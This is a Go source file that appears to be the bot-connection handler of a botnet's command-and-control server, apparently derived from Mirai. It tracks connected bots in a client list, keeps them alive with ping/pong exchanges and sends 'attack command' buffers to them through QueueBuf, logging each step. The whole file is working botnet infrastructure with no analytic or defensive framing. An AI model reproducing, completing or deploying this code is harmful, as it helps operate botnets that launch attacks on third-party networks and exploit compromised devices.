package main

import (
    "fmt"
    "net"
    "time"
)

type Bot struct {
    uid     int
    conn    net.Conn
    version byte
    source  string
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
    return &Bot{-1, conn, version, source}
}

func (this *Bot) Handle() {
    fmt.Printf("[CNC] Bot handler started for %s\n", this.conn.RemoteAddr())
    clientList.AddClient(this)
    defer clientList.DelClient(this)

    buf := make([]byte, 2)
    for {
        this.conn.SetDeadline(time.Now().Add(180 * time.Second))
        if n,err := this.conn.Read(buf); err != nil || n != len(buf) {
            fmt.Printf("[CNC] Bot read error: %v (read %d bytes)\n", err, n)
            return
        }
        fmt.Printf("[CNC] Bot ping received: %02x %02x\n", buf[0], buf[1])
        if n,err := this.conn.Write(buf); err != nil || n != len(buf) {
            fmt.Printf("[CNC] Bot write error: %v (wrote %d bytes)\n", err, n)
            return
        }
        fmt.Printf("[CNC] Bot pong sent: %02x %02x\n", buf[0], buf[1])
    }
}

func (this *Bot) QueueBuf(buf []byte) {
    n, err := this.conn.Write(buf)
    if err != nil {
        fmt.Printf("[CNC] Failed to send attack command to bot %s: %v\n", this.conn.RemoteAddr(), err)
    } else {
        fmt.Printf("[CNC] Attack command sent to bot %s (%d bytes written)\n", this.conn.RemoteAddr(), n)
    }
}
